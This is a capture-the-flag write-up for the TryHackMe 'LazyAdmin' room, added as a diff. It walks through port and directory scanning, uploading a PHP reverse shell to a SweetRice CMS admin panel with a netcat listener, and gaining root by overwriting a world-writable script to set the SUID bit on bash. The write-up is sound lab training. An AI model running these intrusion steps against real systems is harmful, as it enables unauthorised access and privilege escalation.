@@ -1,0 +1,92 @@
+# TryHackMe — LazyAdmin
+
+**Target IP:** 10.113.134.93
+
+---
+
+## Reconnaissance
+
+### Port Scan
+
+```
+nmap -sV -sC -p- 10.113.134.93
+```
+
+Results:
+
+```
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
+```
+
+### Web Enumeration
+
+```
+gobuster dir -u http://10.113.134.93/content -w /usr/share/wordlists/dirb/common.txt
+```
+
+Results:
+
+```
+/_themes     (Status: 301)
+/as          (Status: 301)  — admin panel
+/attachment  (Status: 301)
+/images      (Status: 301)
+/inc         (Status: 301)
+/js          (Status: 301)
+```
+
+The application is running **SweetRice CMS**. The admin panel is accessible at `/content/as/`.
+
+---
+
+## Initial Access
+
+After logging into the SweetRice admin panel, a PHP reverse shell was uploaded via the Ads section and saved to `/content/inc/ads/`.
+
+Listener on attacker machine:
+
+```
+nc -lvnp 4444
+```
+
+Navigating to the uploaded shell triggered execution and returned a shell as **www-data**.
+
+**User flag:** `THM{[REDACTED]}` (at `/home/itguy/user.txt`)
+
+---
+
+## Privilege Escalation
+
+Sudo permissions for `www-data`:
+
+```bash
+sudo -l
+```
+
+```
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+```
+
+`backup.pl` calls `/etc/copy.sh`. That file has world-write permissions:
+
+```bash
+ls -l /etc/copy.sh
+-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+```
+
+`copy.sh` was overwritten to set the SUID bit on bash:
+
+```bash
+echo "chmod +s /bin/bash" > /etc/copy.sh
+sudo /usr/bin/perl /home/itguy/backup.pl
+bash -p
+```
+
+```
+bash-4.3# whoami
+root
+```
+
+**Root flag:** `THM{[REDACTED]}` (at `/root/root.txt`)
